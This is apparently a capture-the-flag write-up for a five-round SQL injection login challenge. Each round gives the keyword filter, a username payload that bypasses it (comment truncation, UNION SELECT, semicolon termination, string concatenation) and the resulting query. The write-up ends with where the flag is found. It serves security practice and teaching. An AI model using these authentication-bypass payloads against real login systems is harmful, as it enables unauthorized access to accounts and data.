

Try to login as admin in each round with SQL injection, mind the filter.  

## Round 1

 Filter: ``or``

 Username: ``admin' --``

 Password: ``123``

 Actual Query: ``SELECT * FROM users WHERE username='admin' -- AND password='123'``

## Round 2

Filter: ``or and = like --``

Username: ``admin' union select * from users where '1``
  
Password: ``123``

Actual Query: ``SELECT * FROM users WHERE username='admin' union select * from users where '1' AND password='123'``

## Round 3

  Filter: ``or and = like > < --``

  Username: ``admin';``

  Password: ``123``

  Actual Query: ``SELECT * FROM users WHERE username='admin';' AND password='123'``

## Round 4

  Filter: ``or and = like > < -- admin``

  Username: ``ad'||'min';``

  Password: ``123``

  Actual Query: ``SELECT * FROM users WHERE username='ad'||'min';' AND password='123'``

## Round 5

  Filter: ``or and = like > < -- union admin``

  Username: ``ad'||'min';``

  Password: ``123``

  Actual Query: ``SELECT * FROM users WHERE username='ad'||'min';' AND password='123'``

## Flag
All rounds have been passed, the page of round 6 says *"Congrats! You won! Check out filter.php"*. Refresh ``filter.php`` again it shows the source code of ``filter.php`` and flag is at the end of the page.

